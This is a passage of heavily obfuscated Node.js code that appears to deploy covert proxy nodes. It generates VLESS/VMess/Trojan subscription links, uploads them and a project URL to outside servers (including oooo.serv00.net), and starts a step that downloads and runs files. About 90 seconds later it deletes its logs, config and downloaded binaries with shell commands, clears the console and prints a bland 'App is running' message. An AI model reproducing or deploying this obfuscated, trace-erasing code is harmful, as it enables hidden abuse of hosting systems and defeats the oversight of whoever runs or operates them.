axios[_0x3dfe2f(0x11a)](_0x3dfe2f(0x120),{'timeout':0xbb8});if(_0x32e3dd[_0x3dfe2f(_0x373ce4._0x118bce)]&&_0x32e3dd[_0x3dfe2f(_0x373ce4._0x118bce)][_0x3dfe2f(_0x373ce4._0x4f3c5b)]===_0x3dfe2f(_0x373ce4._0x53f6f9)&&_0x32e3dd[_0x3dfe2f(_0x373ce4._0x118bce)][_0x3dfe2f(_0x373ce4._0x5e7e67)]&&_0x32e3dd[_0x3dfe2f(_0x373ce4._0x2c8c61)][_0x3dfe2f(0xc1)])return _0x32e3dd[_0x3dfe2f(_0x373ce4._0x2c8c61)][_0x3dfe2f(0x10e)]+'_'+_0x32e3dd[_0x3dfe2f(_0x373ce4._0x453ecd)][_0x3dfe2f(0xc1)];}catch(_0x1c41e1){}}return _0x3dfe2f(0x138);}async function _0x36503e(_0x41fcc3){const _0x1a13cb={_0xf1d44:0x98,_0x5ad18d:0xab,_0x3e81cf:0x9a,_0x21c1ed:0x13a,_0x94d9f8:0x13f,_0x40aa77:0xad,_0x368c6e:0x11c,_0x4410e2:0xf0,_0x24b7e5:0x8e,_0x4c0158:0x121,_0xe72c21:0x130,_0x408e01:0xf0,_0x37768b:0x126,_0x3ec9ae:0x11a},_0x2ed435=await _0x1e8237(),_0x22ba07=NAME?NAME+'-'+_0x2ed435:_0x2ed435;return new Promise(_0x5d8fa7=>{setTimeout(()=>{const _0x45ea5b={_0x44928b:0xf0,_0x1774e9:0x8b},_0x3b2fe0=_0x8da4,_0x827004={'v':'2','ps':''+_0x22ba07,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x41fcc3,'path':_0x3b2fe0(0x143),'tls':_0x3b2fe0(_0x1a13cb._0xf1d44),'sni':_0x41fcc3,'alpn':'','fp':_0x3b2fe0(_0x1a13cb._0x5ad18d)},_0x1735e0=_0x3b2fe0(_0x1a13cb._0x3e81cf)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x41fcc3+_0x3b2fe0(0x83)+_0x41fcc3+_0x3b2fe0(_0x1a13cb._0x21c1ed)+_0x22ba07+_0x3b2fe0(_0x1a13cb._0x94d9f8)+Buffer['from'](JSON[_0x3b2fe0(_0x1a13cb._0x40aa77)](_0x827004))[_0x3b2fe0(_0x1a13cb._0x368c6e)](_0x3b2fe0(_0x1a13cb._0x4410e2))+_0x3b2fe0(_0x1a13cb._0x24b7e5)+UUID+'@'+CFIP+':'+CFPORT+_0x3b2fe0(0xaa)+_0x41fcc3+_0x3b2fe0(0x83)+_0x41fcc3+_0x3b2fe0(_0x1a13cb._0x4c0158)+_0x22ba07+_0x3b2fe0(0x141);console['log'](Buffer[_0x3b2fe0(_0x1a13cb._0xe72c21)](_0x1735e0)['toString'](_0x3b2fe0(0xf0))),fs['writeFileSync'](subPath,Buffer[_0x3b2fe0(0x130)](_0x1735e0)['toString'](_0x3b2fe0(_0x1a13cb._0x408e01))),console[_0x3b2fe0(0x96)](FILE_PATH+_0x3b2fe0(_0x1a13cb._0x37768b)),uploadNodes(),app[_0x3b2fe0(_0x1a13cb._0x3ec9ae)]('/'+SUB_PATH,(_0x13006a,_0x55740e)=>{const _0x194c7e=_0x3b2fe0,_0x430633=Buffer['from'](_0x1735e0)[_0x194c7e(0x11c)](_0x194c7e(_0x45ea5b._0x44928b));_0x55740e[_0x194c7e(0x12c)](_0x194c7e(0x139),_0x194c7e(_0x45ea5b._0x1774e9)),_0x55740e['send'](_0x430633);}),_0x5d8fa7(_0x1735e0);},0x7d0);});}}async function uploadNodes(){const _0x388a04={_0x704be7:0x9d,_0x344f1a:0xd7,_0x3eae4e:0x117,_0x2fda55:0x127,_0x26f78c:0xa3},_0x1355ef=_0x39f8e6;if(UPLOAD_URL&&PROJECT_URL){const _0x32c24a=PROJECT_URL+'/'+SUB_PATH,_0xe3a42c={'subscription':[_0x32c24a]};try{const _0x3cfbb7=await axios[_0x1355ef(0x10c)](UPLOAD_URL+_0x1355ef(0x11b),_0xe3a42c,{'headers':{'Content-Type':_0x1355ef(0x136)}});return _0x3cfbb7&&_0x3cfbb7[_0x1355ef(0x117)]===0xc8?(console[_0x1355ef(0x96)](_0x1355ef(_0x388a04._0x704be7)),_0x3cfbb7):null;}catch(_0x158dd1){if(_0x158dd1[_0x1355ef(_0x388a04._0x344f1a)]){if(_0x158dd1['response'][_0x1355ef(_0x388a04._0x3eae4e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1355ef(0x12e)](listPath))return;const _0x482431=fs['readFileSync'](listPath,_0x1355ef(_0x388a04._0x2fda55)),_0x1c75cf=_0x482431[_0x1355ef(0x137)]('\x0a')['filter'](_0x5d1605=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1355ef(0xc2)](_0x5d1605));if(_0x1c75cf[_0x1355ef(_0x388a04._0x26f78c)]===0x0)return;const _0x52a2ab=JSON['stringify']({'nodes':_0x1c75cf});try{const _0x49abb8=await axios[_0x1355ef(0x10c)](UPLOAD_URL+_0x1355ef(0xfb),_0x52a2ab,{'headers':{'Content-Type':_0x1355ef(0x136)}});return _0x49abb8&&_0x49abb8[_0x1355ef(_0x388a04._0x3eae4e)]===0xc8?(console[_0x1355ef(0x96)](_0x1355ef(0x8a)),_0x49abb8):null;}catch(_0x30443a){return null;}}else return;}}function cleanFiles(){const _0x30d9b9={_0x50e3e8:0xc5,_0x5b6abb:0x100},_0x47348c={_0xfbd817:0x95,_0x5a99cb:0x96,_0x4b970d:0x96};setTimeout(()=>{const _0x163947={_0x5c19c8:0x96},_0x5e5719=_0x8da4,_0x376bfe=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x376bfe[_0x5e5719(0xc0)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x376bfe[_0x5e5719(0xc0)](phpPath);process[_0x5e5719(_0x30d9b9._0x50e3e8)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x376bfe[_0x5e5719(0xe5)]('\x20')+'\x20>\x20nul\x202>&1',_0x212355=>{const _0x5565f8=_0x5e5719;console['clear'](),console[_0x5565f8(_0x163947._0x5c19c8)]('App\x20is\x20running'),console['log'](_0x5565f8(0xd0));}):exec(_0x5e5719(_0x30d9b9._0x5b6abb)+_0x376bfe['join']('\x20')+_0x5e5719(0x104),_0x2e4f53=>{const _0x16940a=_0x5e5719;console[_0x16940a(_0x47348c._0xfbd817)](),console[_0x16940a(_0x47348c._0x5a99cb)]('App\x20is\x20running'),console[_0x16940a(_0x47348c._0x4b970d)](_0x16940a(0xd0));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x30ecc7={_0x22e135:0x96,_0x2254d4:0x96,_0x478b83:0xac},_0x466e18=_0x39f8e6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x466e18(_0x30ecc7._0x22e135)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0xada243=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x466e18(_0x30ecc7._0x2254d4)](_0x466e18(0xf2)),_0xada243;}catch(_0x2393c0){return console['error'](_0x466e18(0xa7)+_0x2393c0[_0x466e18(_0x30ecc7._0x478b83)]),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x510de5){console['error']('Error\x20in\x20startserver:',_0x510de5);}}startserver()['catch'](_0x1a9d85=>{const _0x11f705={_0x4734ee:0xff},_0x53ac79=_0x39f8e6;console[_0x53ac79(_0x11f705._0x4734ee)](_0x53ac79(0x86),_0x1a9d85);}),app[_0x39f8e6(0xe9)](PORT,()=>console[_0x39f8e6(0x96)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
